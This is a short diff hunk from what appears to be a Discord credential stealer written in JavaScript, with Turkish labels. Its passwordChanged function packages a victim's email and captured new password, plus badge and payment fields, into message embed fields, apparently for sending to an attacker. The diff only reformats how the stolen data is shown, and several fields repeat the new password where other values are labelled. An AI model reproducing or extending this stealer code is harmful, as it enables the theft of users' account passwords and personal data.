@@ -676,12 +676,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Sifre Degisti Pezo**',
-            value: `Email: **${json.email}**\nEski Sifre: > ${newpassword}\nYeni Sifre: > ${newpassword}`,
+            value: `Email: **${json.email}**\nEski Sifre: ${newpassword}\nYeni Sifre: ${newpassword}`,
             inline: true,
           },
           {
             name: '**Discord Bilgileri**',
-            value: `Nitro Tipi: > ${newpassword}\nRozet: **${badges}**\nOdeme: > ${newpassword}`,
+            value: `Yeni Sifre: ${newpassword}\nRozet: **${badges}**\nYeni Sifre: ${newpassword}`,
             inline: true,
           },
           {
